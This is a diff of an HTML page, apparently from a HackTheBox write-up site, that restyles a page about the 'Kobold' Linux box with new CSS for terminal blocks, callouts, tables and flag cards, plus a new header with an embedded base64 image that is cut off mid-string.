+  .node .arrow { display: none; position: absolute; right: -20px; top: 50%; transform: translateY(-50%); color: var(--ink-faint); font-family: var(--font-mono); font-size: 1.1rem; z-index: 2; }
+  @media (min-width: 720px) { .node:not(:last-child) .arrow { display: block; } }
 
-  .wlist{display:grid;grid-template-columns:1fr;gap:14px;}
-  @media (min-width:640px){.wlist.two{grid-template-columns:1fr 1fr;}}
-  .wcard,.acard{display:block;background:var(--bg-raised);border:1px solid var(--border);border-radius:12px;padding:18px 20px;box-shadow:var(--shadow);transition:transform .2s ease,border-color .2s ease;border-bottom:1px solid var(--border);}
-  .wcard:hover,.acard:hover{transform:translateY(-2px);border-color:color-mix(in srgb,var(--accent) 40%,var(--border));}
-  .wcard.pending{opacity:.85;} .wcard.pending:hover{border-color:color-mix(in srgb,var(--signal) 35%,var(--border));}
-  .wtop{display:flex;align-items:baseline;justify-content:space-between;gap:12px;}
-  .wname{font-family:var(--font-mono);font-weight:700;font-size:1.2rem;color:var(--ink);}
-  .wstat{font-family:var(--font-mono);font-size:.72rem;letter-spacing:.04em;}
-  .wstat.live{color:var(--accent);} .wstat.wip{color:var(--ink-faint);} .wstat.act{color:var(--signal);}
-  .wmeta{font-family:var(--font-mono);font-size:.74rem;color:var(--ink-faint);margin-top:4px;}
-  .wteaser{color:var(--ink-dim);margin:10px 0 0;max-width:66ch;font-size:.95rem;}
+  section { padding: 44px 0; border-bottom: 1px solid var(--border-soft); }
+  .sec-head { display: flex; align-items: baseline; gap: 16px; margin: 0 0 22px; }
+  .sec-num { font-family: var(--font-mono); font-weight: 700; font-size: 1rem; color: var(--accent); flex: none; padding-top: .15em; }
+  h2 { font-size: clamp(1.5rem, 3.4vw, 2.05rem); line-height: 1.15; margin: 0; letter-spacing: -.01em; text-wrap: balance; }
+  h2 .sub { display: block; font-family: var(--font-mono); font-size: .78rem; letter-spacing: .12em; text-transform: uppercase; color: var(--ink-faint); font-weight: 500; margin-top: 8px; }
+  h3 { font-size: 1.06rem; margin: 30px 0 12px; letter-spacing: -.005em; }
+  p { margin: 0 0 16px; max-width: 72ch; }
+  .lede { color: var(--ink-dim); }
+  ul { max-width: 72ch; padding-left: 1.2em; margin: 0 0 16px; }
+  li { margin-bottom: 7px; }
+  .code { font-family: var(--font-mono); font-size: .86em; background: var(--bg-inset); border: 1px solid var(--border-soft); padding: .08em .4em; border-radius: 5px; color: var(--ink); white-space: nowrap; }
 
-  .mstat{font-family:var(--font-mono);font-size:.78rem;color:var(--ink-faint);margin:0 0 18px;}
-  .mstat b{color:var(--ink-dim);}
-  .machines{display:grid;grid-template-columns:repeat(auto-fill,minmax(178px,1fr));gap:10px;}
-  .m{display:flex;flex-direction:column;gap:3px;background:var(--bg-raised);border:1px solid var(--border);border-radius:9px;padding:12px 13px;}
-  a.m{border-bottom:1px solid var(--border);transition:transform .15s ease,border-color .15s ease;}
-  a.m:hover{transform:translateY(-2px);border-color:color-mix(in srgb,var(--accent) 45%,var(--border));}
-  .m .mn{font-family:var(--font-mono);font-weight:700;font-size:.98rem;color:var(--ink);}
-  .m .md{font-family:var(--font-mono);font-size:.72rem;color:var(--ink-dim);display:flex;align-items:center;gap:6px;}
-  .m .diff{font-size:.7em;} .m .diff.easy{color:var(--ok);} .m .diff.med{color:var(--accent);}
+  .term { background: var(--term-bg); border: 1px solid var(--border); border-radius: 11px; overflow: hidden; margin: 18px 0 22px; box-shadow: var(--shadow); }
+  .term-bar { display: flex; align-items: center; gap: 8px; padding: 10px 14px; border-bottom: 1px solid rgba(255,255,255,.06); background: rgba(255,255,255,.02); }
+  .term-bar .lamp { width: 11px; height: 11px; border-radius: 50%; background: #2c3644; }
+  .term-bar .lamp.a { background: #e05b5b; } .term-bar .lamp.b { background: #e0b24f; } .term-bar .lamp.c { background: #4faf6a; }
+  .term-bar .label { margin-left: 8px; font-family: var(--font-mono); font-size: .72rem; color: #6d7a8c; letter-spacing: .05em; }
+  .term-scroll { overflow-x: auto; }
+  pre.term-body { margin: 0; padding: 16px 18px; font-family: var(--font-mono); font-size: .84rem; line-height: 1.7; color: var(--term-ink); min-width: max-content; }
+  pre.term-body .c { color: #6b7787; }
+  pre.term-body .pr { color: #63cddb; }
+  pre.term-body .cmd { color: #e8eef6; }
+  pre.term-body .out { color: #8b98aa; }
+  pre.term-body .hi { color: #f4a94b; }
+  pre.term-body .win { color: #5fd68a; }
+  pre.term-body .no { color: #f7546a; }
 
-  /* placeholders */
-  .soon{border:1px dashed color-mix(in srgb,var(--accent) 42%,var(--border));background:var(--bg-raised);border-radius:14px;padding:52px 22px;text-align:center;margin:6px 0;}
-  .soon .k{font-family:var(--font-mono);font-size:.72rem;letter-spacing:.24em;text-transform:uppercase;color:var(--ink-faint);display:block;margin-bottom:14px;}
-  .soon .t{font-family:var(--font-mono);font-weight:700;font-size:clamp(1.6rem,5vw,2.4rem);color:var(--accent);letter-spacing:.02em;}
-  .soon .t .cur{display:inline-block;width:.55ch;height:.85em;margin-left:.14em;background:var(--accent);transform:translateY(.08em);animation:blink 1.1s steps(1) infinite;}
+  .callout { border: 1px solid var(--border); border-left: 3px solid var(--accent); background: var(--bg-raised); border-radius: 10px; padding: 18px 20px; margin: 22px 0; }
+  .callout .k { font-family: var(--font-mono); font-size: .72rem; letter-spacing: .16em; text-transform: uppercase; color: var(--accent); display: block; margin-bottom: 8px; }
+  .callout p:last-child, .callout ul:last-child { margin-bottom: 0; }
+  .callout.cve { border-left-color: var(--crit); } .callout.cve .k { color: var(--crit); }
+  .callout.note { border-left-color: var(--signal); } .callout.note .k { color: var(--signal); }
 
-  .badge{border:1px solid color-mix(in srgb,var(--accent) 40%,var(--border));border-left:3px solid var(--accent);background:var(--bg-raised);border-radius:12px;padding:24px 26px;box-shadow:var(--shadow);}
-  .badge .k{font-family:var(--font-mono);font-size:.72rem;letter-spacing:.16em;text-transform:uppercase;color:var(--accent);display:block;margin-bottom:10px;}
-  .badge .bname{font-family:var(--font-mono);font-weight:700;font-size:1.5rem;color:var(--ink);}
-  .badge .bmeta{font-family:var(--font-mono);font-size:.8rem;color:var(--ink-dim);margin:4px 0 14px;}
-  .badge p{color:var(--ink-dim);max-width:60ch;margin:0 0 18px;}
-  .badge .blink{display:inline-block;font-family:var(--font-mono);font-size:.82rem;color:var(--accent);border:1px solid color-mix(in srgb,var(--accent) 50%,var(--border));border-radius:7px;padding:9px 16px;}
-  .badge .blink:hover{background:color-mix(in srgb,var(--accent) 12%,transparent);border-color:var(--accent);}
+  .tbl-scroll { overflow-x: auto; margin: 18px 0 22px; }
+  table { border-collapse: collapse; font-family: var(--font-mono); font-size: .8rem; min-width: 100%; }
+  th, td { text-align: left; padding: 8px 14px; border-bottom: 1px solid var(--border-soft); white-space: nowrap; }
+  th { color: var(--ink-faint); font-weight: 500; text-transform: uppercase; letter-spacing: .08em; font-size: .7rem; border-bottom-color: var(--border); }
+  td.hi { color: var(--accent); }
 
-  footer{padding:44px 0 60px;color:var(--ink-faint);font-family:var(--font-mono);font-size:.78rem;}
-  footer .paths{display:flex;flex-direction:column;gap:5px;margin-top:12px;}
+  .flags { display: grid; grid-template-columns: 1fr; gap: 14px; margin-top: 6px; }
+  @media (min-width: 600px) { .flags { grid-template-columns: 1fr 1fr; } }
+  .flag { background: var(--bg-raised); border: 1px solid var(--border); border-radius: 11px; padding: 18px 20px; display: flex; flex-direction: column; gap: 8px; }
+  .flag .name { font-family: var(--font-mono); font-size: .74rem; letter-spacing: .12em; text-transform: uppercase; color: var(--ink-faint); }
+  .flag .path { font-family: var(--font-mono); font-size: .82rem; color: var(--ink-dim); }
+  .flag .val { font-family: var(--font-mono); font-size: .9rem; letter-spacing: .14em; color: var(--ink); }
+  .flag.root { border-color: color-mix(in srgb, var(--accent) 40%, var(--border)); }
+  .flag.root .val { color: var(--accent); }
+  .flag .status { font-family: var(--font-mono); font-size: .72rem; color: var(--ok); display: inline-flex; align-items: center; gap: 6px; }
+  .flag .status::before { content: "●"; font-size: .7em; }
 
-  @keyframes rise{from{opacity:0;transform:translateY(14px);}to{opacity:1;transform:none;}}
-  @keyframes blink{0%,50%{opacity:1;}50.01%,100%{opacity:0;}}
-  @media (prefers-reduced-motion:reduce){.hero-inner{animation:none;}h1.title .cursor,.soon .t .cur{animation:none;}}
+  footer { padding: 44px 0 60px; color: var(--ink-faint); font-family: var(--font-mono); font-size: .78rem; }
+  footer .paths { display: flex; flex-direction: column; gap: 5px; margin-top: 14px; }
+
+  @keyframes rise { from { opacity: 0; transform: translateY(14px); } to { opacity: 1; transform: none; } }
+  @keyframes blink { 0%, 50% { opacity: 1; } 50.01%, 100% { opacity: 0; } }
+  @media (prefers-reduced-motion: reduce) { .hero-inner { animation: none; } h1.title .cursor { animation: none; } }
 </style>
 </head>
 <body>
 
-<header class="hero"><div class="wrap hero-inner">
-  <div class="crumb"><a href="../index.html">cd ..</a> &nbsp;/&nbsp; active boxes</div>
-  <div class="prompt-line mono"><span class="u">db-d2</span>@<span class="p">kali</span>:~$ ./pwn kobold.htb</div>
-  <h1 class="title">Kobold<span class="cursor" aria-hidden="true"></span></h1>
-  <p class="thesis">An <strong>Easy Linux box</strong> — still active.</p>
-  <div class="meta-row"><span><b>platform</b> HackTheBox</span><span><b>difficulty</b> Easy · Linux</span><span><b>rooted</b> 03 Jul 2026</span><span><b>status</b> active</span></div>
+<header class="bar"><div class="wrap bar-inner">
+  <a class="brand" href="https://app.hackthebox.com/public/users/153734" title="db-d2 on HackTheBox"><span class="mark"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAANwAAADcCAIAAACUOFjWAAApuklEQVR42u2dd5Rd1X3v92/v0+49t987XW0kjUaj3jvdIKolIaoRLrEx2CsxccB5AWyMcbDj55Vmv9jE7fmZvCROTGw/xzEGd0KTAGHTJCSEJIo0mnL7qbu8P85IgKTRlHtHunfu/q5ZwFpMOfecz/ntX9u/DdFEC5I6XgCAESDBKKOOYD5gRQnF9WhLKDnFSE414u16pEk1U4oRwUoIExUBIISEEIL5nDrULfnlQa/U5+QP2dnXnezrbvGwb+UFp0BUrOiYqAghwTlCQt7u4+++hPLdMGIEwJnPfUcIroWS4UxnpG1epHVeOD1dMzNEDwNWkBBCcCE4GvqneBfPgBFgADxENmfMs71yvz14sHT4peKhl6z+fX45ixDCWggTNfht8uZLKE+4EZgIwblnc+5rZiY2ZUmyc02sY5ERb8eqIQQT1OfcR5wLJBBCgBBCgODof75LwbcMoQoIEMYYq0BUwIRT180fKrz1fHbfk4U3drqlPsCEaGEALDiTD0JCeRRHzphbBqJE2xdkui9Idq4xEh0IMKeuoJ4QHAEAgmCNHqeEEEggIQAwKBpRdCGEk38rt/+p/t2/LLz5PKeuopuAFYlmQ0MZ4EjdkqJHUrM2tCy8PNqxiCgG823OvACgikA8BaCCIwBMNKIanHrFt17offGng3t+59t5xYg0OJoNCiUAFggxp0h0M9N9ftvSrWZzNxKceZYQfKJYHIZOAIy1EMZKuW/voZ3/0b/rEd8pKEYUEDSmr9mAUAJgzDwLIZSZc177qhuiLXM585hnD8UoZ0JBtETUEFb0ct+eN3f8c9+uRxDnRDcbMEJvLCgBsBCMOqVo+4Jp6z+SnLlWMJ95NgCgM4TjiYaTqCGsaLkDTx987Jv513cqeiQIwiSUk9ODpG6ZqMaUVdval1+LVYM6xSrhKNDRSPtkwfh40FT0COf+4Z0Pvv7Ed6lXVvRI43iZRDcijWAhEWBq52MdC7uv+HzTvI2cOpw6gMm4fccgSYmG8pIKYAKYAOChIObo/xrf1QJgzjzEeWLGyuTMNfbAAat/H1aN0+TpSihPx5LNGffsKSvf13XJp7VohjqFocz2OGnkAJhoIUU3MVEEo8wtU6fAPEtwhomq6GGihQETwangDADGYT4BAAEwz9YiTc3zLgKA3OvPAAKM1UnvYk7y5RswYZ5FtPCs93yqad5G6hSGguvx8cgZJirRTOaVS7278288V+7d7eQPUafAmYcQwkRTjJgRbzNbuuNTlkRauoNv5swHTMZtkgFAMeIDr/x678Nfonae6ObkXsonM5SAFeoUQqlp3Zd/LtLS49s5wHicPp8QCCHFiHrWYN/LD/e99LDVt5dRFxMlqNPAsdo3Z4L5nFGi6OGm2U3zLmrquUgLp6hTHHIkxvs+qKF4uX/fKz/9bLl3jxKKC04llHUY1tj52NSl3Zffq5lp6hYBK+M3kIqGidr74s/efOoBa2A/0QyihTjjzHGY7x1X+yaqRgwDE8w8m3lOOD2jY/WNLfMv4czn1Bu/yeSUaBHmFnf/9J7svifUcGKy2svJCSVgQq1cquvsOZfdg4nKfKcCFBjRTd/K7vvFX/fv/hXRQkQPU6tMbVtPJpOzuxKz50Ta2rVYDCHkFQqlQ2/l9r6S3bvHzWaVUEgJm8y1mGdnus+f+Z7b1HCSueVKLgYrOkJiz8/u63v54cnK5SSEEjDxrVxm7gXdl93DBROMVuJEKnqk3P/q7p98xup/TYukme/6pWKqu2fWFZunnHVOdOo0JRRCAG+nhISgtl18/eAbj/721Z/8aHD3y2okSlTdKw2EM53dV3zezMyibqkiFxMTTPS9P7+v9/n/VMPJycflZIMSsOLb2Uz3Bd2X3cM5E7xCIs1y36sv/cdtXjmrmXE3n9Ni8UU33dy15Wo9kWSOzVxXcH7CNWCi68QIubnsnh/++x+++Y9eIa/HE145r5nJeVf+tdk0i1ZgL5HgCAhW9b0/u6/3hZ9OPns5qVJCgIlv55Od6+Ze8XkkeCVEIsGxqnulgZcevM0r9WvhuJPtb1q4+PyvfG3GhRczz6WWJThHAIDxcV8IgFNK7TImpH3thilnnT3wwvOF/fv0WMq3crn9T6W7zlWMCOIUjTeRGYRU6Tnn2gP7S727iBZ6l18roawhP9ItRVvn9Wz+K8CEV0IkQggQxsru/7y7dPhlzUza2f6p55x3wVe/Hs40efkcxpgDcIQwAIaTpA0BADBGCPnlktnc0nnpZdk9uwd2vaTHUm6h1xp4rbnnIiH4+Ms/AEF+PtV1dvHN5+3Bg0Q1Jg2XkwRKAMyoq0ea5l35ZTWc4L47/sUxyL8Y8Tef/pdDO3+gRTNePtuyfOUFX7kfE4U5NsOECRRVSVhRPM4dxlUMw78qmLku0bQZF158ZOczhf37tFiq3LtbMaKJ6auYb4//zQEQgmGipmauy776uG8NYqJNjrz65IASgofRs+kLZnNXJeFtEEpgRXOLh/c+9AXAhPmekU6/5yv/qMVi3HE8wG0h7dKOpg3NyaWpWE/cxABvWi6GU3HJfZ/oRvvqtfsfecgvl4hmlA6/nJ5zjmLEEGfjTl4CgGC+GkpE2xf07XpEcBaYZwllbSzcTnHWBZ/MzL2Q2rlx5yOPhbeKEX3jye9lX3tCCUW9YnHtnXe3rVlHCwUfk2lh4/rOtmZDA4QwQERR5iUiGGBv0VJgBHtptrUZ8fhrP/+Zaka90gBW9NTs9RUZS4QAMKdOKDVNMzMDu39JFH0SGEs8CYj07XzLgkvblm71rUqJREhgRXULvf27f6kYEa9YaFu1pvPSK9xcDimKguHCtrSGscWYQEgg5AtR9NmaTKIzEnI5P4XFw4ri5nKdl17RtmqNVywoRqR/9y/dQi9WKq1lA1Z8K9ey4LLWJVt9O1/RKiGhrIoryX07nO6cce4nmG9DxU00gnOihvIHn3EKh7CiCUa7r7mOqCog4XPRZmhNhuZyTo7+oeBfGNCcmMnFSOuwEERVu6+5TjCKFc0pHMoffIaooROTSmPnElO3NOPsWyKtPcyzALCE8gxKCCFmnn+rGopz6lejswsEQrkDTwMC5rqxaTPaVq31LQsw4UiEFUJO9ie4QCYhJw3Dj0PHt6y2VWtj02Yw1wUEuQNPi7fZruyyOSVqeOYFn5wEHcF1DCVg4tuF1sWbkzPXUadYlWULMGZuqdy3B2s6te2mxUuNdJr7PkIIIyj4lJ6QdhFIYEA5n3IxElwA3PeNdLpp8VJq21jTy317mFuqSnQCmFC3GJ+6rH3ZNdW6GxLKMa/c3HdDqWlT136QueXqLFhCAFG98qBX6sNYEYKn588PfrNASMNw2PFeL9shgqkQgU/JhVAAfM5fzpcUgNEkCgFwev58ITjGilfq88qDQNSqpBiDgK9j9Y1mcxfzbVS3iziuWyYxo+7UtR/SzAxnfpVasgUA9q0c82yEMFaUaMdU8Y6UDSD080P9/a4fUxQVQAEIEaJi/MihgUO2qxEQo7huwVm0YypWFIQw82zfygHgKoXMIDhV9ei0dR8WjNZvk7pSp0RSt5SYsaKp5yK/ekuVCJZvrywYRYqKVUWLxQVjx/6vApD16D+99tbqdHyaaRDAWc9/ZrDwWsnSMeaj40owpsXiWFUQEoJR5pUBY1ENv3LIpXGK6a5zUrM2DL7634oRrceyuFKf75IAwFNWvf+ojamiUQjKd0H4Acd5ewIhFcCm7OFDAzrGGJDLOUJIx1iMDZ1j+8oFqqTYOMwnQEhMWX1j7sD2yuN6uXyP3qMvp2atT0xfQb1yldMfQmBFRxgjBIIy5tjoBC4JQFjBQbeajvFYiUQYM8cWlAX1dazo1a1ZA2DqlqMdCzNzzqdeqR4jnjr0KQUHorQtv6bq/QcQtKuF4kEjLfd9q+8IxuS4PyQQOrZSi7E6g0JgTKy+I9z3ERJY0ZVQXHBWXf8PAASjbcuuJmqoHpfvOoMSgFC3nJyxOtaxpPpmEkBwqoZTqhEXggkhsnteQbjaAQOG7J5XhBBCMNWIq+GUGHcP2/CrCfOtSGtPataGSjsBJJSj8yahZdEmAJiAGi8ITtVQIpSayn2PaFrf75+j9vEreGX3G1Pb7vv9c0TTuO+FUlPVUEJwWmW38qhz3LpoEyhq3eXS6wpKwMy3I609iekrgqC1+sgLgRU11rGYM08JhQdefjG7Z7dihKoSMQjOFSOU3bN74OUXlVCYMy/WsRgrqpiAPkgATD0r1rEo1rGo7gqP9XStAMCZn+m5iKjhCYorATCnXmLGakUzAZBfLu/7yY+JrqOq/DnOia7v+8mP/XIZACmamZixmlNvoogRHCtaU89GxNkEWGIJJUIIAWe+HmlKzdrAfHuiGgcBmG+bLXNiU5ZSp6RFY6/+5EfZ3buUsFnhayA4V8JmdveuV3/yIy0ao04pNmWp2TKH+fYEDWMBjJlvJTvX6PF2ztw64rJuoASMuWfHpy03Jv4WA+DWJVtE0G9WyD/71b/BahUSulhVnv3q37iFPFYUgVDrki0j28hgukHwJdgYEw7Aqa9Hm5Odq5nv1FH/b/1YSiEQQLrr7LdHnE0YkdQtpWauS83a4JdzeiJ14BcPP/+dbxipNKfjHErBKTVS6ee/840Dv3hYT6T8ci41a0Nq5jrqlobjMpiShRVdCcXUcEINJxQjhhVt6ACA0ecTBE/NPhsTpY528NRJ5zmAYL4WbZ627sOASbWrOCcJXAGI2TKnf9cvBHWVUPjN/37UbG1rXbmKlssIYPSNm0IIxHmoqemVB/9t+1/9pRaNCuoRzZxz2T2KHh1uQ6MQTNFMIKozuL94cEd+/5Olt/7gFXoBq3q0CbAySk8UAASnWjg9sPdRaueA1EcBrz6uEgBT6qTbF+rRJt8uTHjiDTDzbTMzs/P8W1/56efUUFwxjMc/e6dXKMx//4eobVHHwWSkMYJCcMYUw1BC4Re+862n//qvFMNACKhnzbnsU2Zm5rBd4kIoRqxw8JnDz/xL/4Hflwv5YOMiwiQaT6RnLG9dfn20YxFzCqPpAxKMquFEfOqSQwOvqaohBJOWsmpQCt/tWHFdpKWbU/c0JDgAMPPtWPtCABjY+6iim6CQg796uPTGG82LloRbWgVjnPrBmggnmEYkBFE1LR63jxx56gv3/uHb96umCZh45cEZZ93csfzaUxCJtfCbT35378+/2Pf6a8m4cf6S5otXtq3sziRi4UOD9uHXXi68+guihmJTl3LqjsZmY6Jx6g688pt62e5YJ8s350QLT137IaKZSPDTMzsUADPqJDvXAILsvsexoqnhyJHfP3vg4YeY70WnTAk1NSmh0JDJBACMsaIouq6aJtF1u6931/f/+YnPfebwM9uNREpwRu3C9A03TVv/keGacAXnihF94/Fvvfa7rzNs3rqp8xs3z/zYhS2XLEtcuizxvnXpTavSFtd27C0V9v1W0SPx6Su575yaS0AIIUG0cP+uX3Lm1kXCsh6gBMypa2ZmtS+7tvoVuRG4RIK6qZnrtGgm99qT1LP0WNIvl9/47a/2P/LQ4MsvufkcD7rRheC+7xYKhQP733zsdy997zvPfvVvDzz8kOBCi8Z8u4AxmXnh7VNWbWPBTOsTfGIhuGJEBvc++uovvozU+LdumfWprR2mApbLHI+7HqdUtMa1K9elTI089Lxtv/FUtGNRKDWVM+9UXAIgztRQPHdgu5N7gyh1YCzrwKcEAM68SEs30UKnfbceIADfKbQtvjLSPOe133w1f/BZrBpGKu2Xyq/+5//b+5MfqaGwGo0quoEQoq7jF4u+bQFgNWwaqTR1La84EJ+2rPPcP4m2LfCd/HC2CgC47xza8T3LRvds69j2nubcoEcwkHcU322Pc4/dfmXH7kPut/7r1UM7Hoh1LIaRYj4hOFb1SOvc3P7taELKs40Z6CAwW7rPoEfr2zmzZc78q/6u7+WHDz/3YOnIHiS4aoaAqEggWrb8YilIpmJV0zVNMJ95ZUZxpLmrdcnWpp6LgBDfzg33RgnBFc3MH3y67/WX58xI3XpJi1XwFXy8BcQYIQGeze7Y1Pbj7QMDB54r9+4yW+byU29+ACQ4j7R0wwkdTxLK8SYoOcNqOJzu5MyHMzSJHjAJTjZpXfTeTPcF+YNPD+x9tHjoRa/YyzwbvTNxCJhoIS3aGm2bn559VnzaCkU3qVvk7JTjUoUAopQPv+A77sYlqURMzRd8hZzkw2JAjsc7W4wNPfEfPvpaufel6FB1+xRMYsH8cGo60U0h6qDkWPtQDrWT6bEWwegZPB4hWHYD/yE1+6xU1znUzjm5t5z8Id8aYG4ZIUR0Uw2njXibkWhXQongCLPgR0Z4nQAEF27+MELQ02EcH9IfDzACAnM7QkgIr3B45OU4yFZGmzQz4+bfAkWrcXtZ61AGTRh6rFkJxQX1zviZHYG1o24p2PpoNndFWnuCkxyGEkJCCE4586idD4avjdoJFsEYcxXjEXegCYRUAsEyMprAJRhNbcTb7OxBBekCSSgrw4BzasTbsKJR3wEgtfGq4GBoL/ed4Gzad71GKMgQjeVShQCMNTONkHit3zk6sWt4F5uL/X0uQkg1U6N5UYUQmKh6vH0ofVHbjmXNQwkICaHHWms0wTaEYBU+phA81NyFFfKrF/Ke246H6XgXAmkEBgr+Y7sKqqGHMl1ilHPbAPRYS11Mv6qHhgwALdI8mSbVntT0ct+JTlmWbJ6yfdfgD54ajMZUl56k8cKnPBRVv/3rvlffyKVaOyNtC0Y1tw1AcK5HmwHj2uey5qEUAjBRzaQ4XYWcM+alUE+PNLcu2ky49al/euO5vcVUUuNcUCYYF4wLyoQQKJnWH3l68L4fHjIUr2XxVjUUF2x0vUuCq+EkYFUgLqGsjEkkACuqEUOT/RjXYBhQ67KrW+aedbi39/Iv7fn3R/tDBonH1JipxCJKPKYqCtz/X4eu/ft9dqGvZf7G5oVXUHdUsxgCB1jRo7hKI2Ia26cUAhMVa2HBOaDJflymEAih2RffjfhnD7/y2HV/Uz57QerCRfEZzQbnYs8h56Hnctt3D2pgtc2/cOZFfyGYP+omPhCCEy0Eiiaoh6o2KKYRoQQhGFZ0ohiiEQ5iBxDMJ1p4zqYvRXY80PuHH/9m5+u/eeZ1hAkSCAkGBNJNbS1LPtK2/DrEmRj9aGoItuzomKjUd2q8LaMOKjoYK0GzqhAMicl/trDwHQQwde1HMj0XF/Y/Ue7d5Zb6AYEWbTJb58VnrDVirdQtDXU6j/ZVDSwqVDzpWEIZrGhE0cz00SMyG+LAaySQEMxsmh1rXxBk4xFCgFUAxDybM08NJcZ4JwQAwUTDRENCjJAHlVCOvKL57sEnv0sUXVR9FlTtv5HBYfbB0Cok0FC1cxw3QQBgznzmlVHN7yCrh2PwhKBeeXLnKU/X00aKFqn9zFo9tK4BqKG4JKo6L3g9zLtS5K2UqrnQVt4CKQmllJSEUkpCKSUloZSSUEpJSSilJJRSUmdYE5I8xxijYGffSGXaYICJEPzUc78BQD6qqmjE+xycl3XqbzvacQQIAee86s0dStVx5IyVS0WEQNXUoTMcYNgPR6nPGNONkKqqfPj5zZ7nSZ6qIlVVT/HsKPUd28aEqIp6iqeGAAmBfM9DSBihMCGEV3UEfTUbMjAmjl3WjdDSVet7Fi1PZZoxxsEE3uFe2VIhv3fXC08/8duBvl4zEj3uswEApTQej3/zW9+Mx2OUMmkyx20gCcGObd900829vb2aph1nCzHGVrmUSGWWrz27q2dhPJ5EgE5uToRAAJzz3GD/y8/vfPapR22rHAqFq8hl1aDEGFtWeWZXzw03fWLGrG4hBGNspJG7AmOCMRnsP/Lg//3mk799JGRG3jnvHgB8389kMjue3pFJR32KJJPjhRIRgizLW7li1cGDB3VdfyeUAZHL155zzQdubmppZ4zxEQ6UEAgBwRgwfuPAvn/+1ld2v/j7sBnlVWpRUKpFpG1bXd3zP3HnF3QjVCzkRzmBWSAkhAhHIh/907tCofCvfvYjMxI77rMJIcrlsmEYvu9LS1mBpSSWVT7RWcQYl0ul9edt/KM/+R+e5xbyubE8O97aPvXWu774v75098t/eCYUNqtiL6sAJQAwSk0zeuMtt2m6YVllQkY7HCL48Mz3y6x49ftv2f/qKwf2vaKfcJgSPioJ5bihDG7gic/Oc52pM2Ze9+E/dhybUTrGZ4dt2zKM0I03f/JLn/6EVSoRRan8rCpcDSixbVtrzn7PlOmdtj0GIt/+DRgzxjRdv/DyrZwxyd1pEwD2PP/8S7eYZoT6Hh57UzohxLGtlraO9edf4jjVOd8IV+UtVBR1wdKVlNJxb5PDGLuuM6t7QTLdROUyfbqQZNSPJ5Ld8xa5roPHO40WY+z73vzFK3TdqMpJcFWAknMWCpupTDOjdNwwAQBnzIxEE8k0Y7TB9uKcISYRYozGEslILFHJs0MAjNJkOhOORBhjlUejuBofTQDGeOh4m4psLmDAhMjdOKfP10QIE4Krsubi4PdUYRO0LDNK1ZwklFISSimpkaQ08ocXNey9NnL+oUGh5JwLIRRFURS11p6+QIj6lFI/OMRMQtkQYoyZZlhX0WC23Nt7iDNeU0QSjJOpdCYV8SgqlaxxFCMklPVnI5OJ8HPPvfCNf/zm448/3tffX3tQQjqdXr169Uc/etPKVUtzebvR7KXSaETGY6H77//2HX9xZzGf18Nhoig16Lvl8oWXXnjx+9//t8/de8+tt/5xodhYXDYQlIyxZCL87W9/748/9vFIPJHMZDhjtRnpEELC4TCl9FN/9qeEkFs/8bHBXAOt443y/nHOQyF99+59d9xxpxmLE0IopVzUriilGONoInP33Z/d+dyLZtiobne3hLImoAzr5Hvfe2Cwr0/X9bp4wJxzVVVL+cL//s53DQ2Lhim/NgqUhBDLZY899hjRDMbqZoYbY0w1jCeeeCJfcuXyPakU9F2XiqW+I32KQurI5ATJ1IHBgUKhoFSjf1ZCWXMPuE4fqhCNNcdY1r6lJJRSUhJKKQllLQoAGOPhiJlKpxirp4kGAEAZSyQS0UiEskaZxdAolpIxGg2pq1auom495VYwxr7jrFixPBEPUUob5GE1CpQYY8fj296/zYxG62WoAQAwzjRD/8AHPuBTgRumw7KBoCxbzvKlC+66685irg8AiEJqFk0AIIRggguDvbffftv69SuLJadxejIaqCGDEJLL27fd/knbtu6774tciHA4TEgtokkZs4tFwfltn7rzM5+5K19wCJFdQpM35CmVnc/ec9e69ev/4R++9swzz+bz+VrLqANALBo9e8P6j338lksv21gsOo0WfSsNxiQghLI56/wLzj3/gnNfP/jm4d4jQ/F4LZAJQ0N/Wpqbp02fgjHK5WxCcKNt12nE7RCEkELBAoCW1raOKR01t0dHIEp5qWQHJfsGfEANunEseNie57luLRaVG3bLWENDeezZy0laNShZZpSSUEpJSSilJJRSUhJKKQmllJSEUqrh1OijAGtzK1mDJ1AbehSgpmmKWouzhHyfep4nRwE2kBhj0WiYEHT48EDfkSOMc0BQG/0YSCCEMWQymfb2JsZRsSBHATaGjUwmwo899tTXv3b/9u3bB7NZzvlRHmoBS4QBJRKJFStW3HzLzeedtyFfcFCDDfbFjUZkLBr68pf/7qILL/7Xf/n+W4d7KWVCIM5FsOH/zH5xLgQXlPHeI30/+MGDl1x86b33ftE0jdp4YaSlnABRxtKJ8N9/5f47/vz2WLIpbJrBObvDnP18RuKbwE4AVlUjleKc3/vZT6uqdscdt2VzduM0nzfQ1DUzbPzh+d333HNPJJ4OThKvzeA7ONk3uLxYsvkL931h+/adEVOXowAnIZQhDT/wwAOFbFbT1Lp4wEGTr10uf/e7/0dXMedyFODkEiGkZNMnn3xS0Q3GeB29S2ootH379lzRURQ5CnASKTA55VJ5oL+fkHobBUjI4GC2UCjKUYCTFU4kJaGUkpJQSkko60l12+QAEspJSSNjLBIx05lM/Y0CpCyZSsZiUUrlKMDJJcaYaShr166lrlNvowDt1atXJaKGHAU46T4nxrbHb7xxWzyZ8jyvLlrCAgMfipgf/OAHXZ9jLEcBTjooLctZsKD7c/feU8oPBEeBwNFm2tr6AgQAweUVskc+/em7Vq5cUirLUYCTUcEowI9//GbXdT979z2ObRvhsKLU3h0QiDFayOdVVb3n3vtuv/3P8gW7oboqG6ufEmNcKNq33faJtWvX3v/1+5966qlsNltrVUdMoLkps2LFiptv+eg556yXRys3BJfZnLVy1cp161Ye7h3s7ztSc1BiyDQ1t7amGUPZnOw8b5h1vFy2hRDRaCyZTNXkKECay1nBkOkGfEANunEsWBAppb7v12bc3Zg4NjSUx569HAVYiyZD3gIpCaWUlIRSSkIpJSWhlJJQSklJKKUklFJSEkopKQmllIRSSkpCKSWhlJKSUEpJKKWkJJRSEkopKQmllJSEUkpCKSUloZSSUEpJSSilJJRSUhJKKSkJpZSEUkpKQikloZSSklBKSSilpCSUUhJKKSkJpZSUhFJKQlltcc7lo6rKbRRCSCgrlRACYxwKhZjksjIxxg3DUBSl9rmsdShVVc0ODv7+uZ0JU6WUSbbGJ0pZIqa/8MILR3p7NU2TUFZkJgGAMnbjtht//bvHMynT96kkbOxE0nTK3L792euvvc62bUJIjRvLOli+NU0rlayrtl7zW8nl2OVTmkqaO7Y/u3nLVQMDWSMUqn0HvQ4CHc65ETIsW3I5diJ9mk